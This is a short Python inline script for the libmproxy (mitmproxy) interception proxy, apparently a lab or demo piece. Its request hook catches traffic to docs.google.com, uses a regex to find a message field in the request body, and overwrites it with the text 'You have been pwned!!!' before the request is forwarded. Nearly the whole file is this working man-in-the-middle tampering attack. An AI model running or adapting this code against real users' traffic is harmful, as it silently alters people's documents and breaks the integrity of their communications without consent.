import logging
import time
import cStringIO
from PIL import Image
from libmproxy.protocol.http import decoded
import re

def request(context, flow):
    try:
        logging.debug("request")
        if (flow.request.pretty_host(hostheader=True).endswith("docs.google.com")):
            #logging.debug("Before:")
            #logging.debug(flow.request.content)
            m = re.match(r'(?P<msg_start>[\w\W]+)(?P<msg_info>\[null,\d+,[^\]]+\])(?P<msg_end>[\w\W]+)', flow.request.content)
            if not m:
            #    logging.debug("Match failed")
                return 0
            replace = (m.group('msg_start') + '[null,2, "You have been pwned!!!"]'+m.group('msg_end'))
            flow.request.content = replace
            logging.debug("Google table request was changed!")
            #logging.debug(flow.request.content)
    except Exception as e:
        logging.debug("CHECK CODE, IDIOT!!!!!!!!!!!")
        logging.debug(type(e))
        logging.debug(e)

def start (context, argv):
    logging.basicConfig(filename="/root/workspace/mitm/log.log",level=logging.DEBUG)
    logging.debug("============================================\n")
    logging.debug(time.time())
    logging.debug("Startup:\n")
    context.log("start")

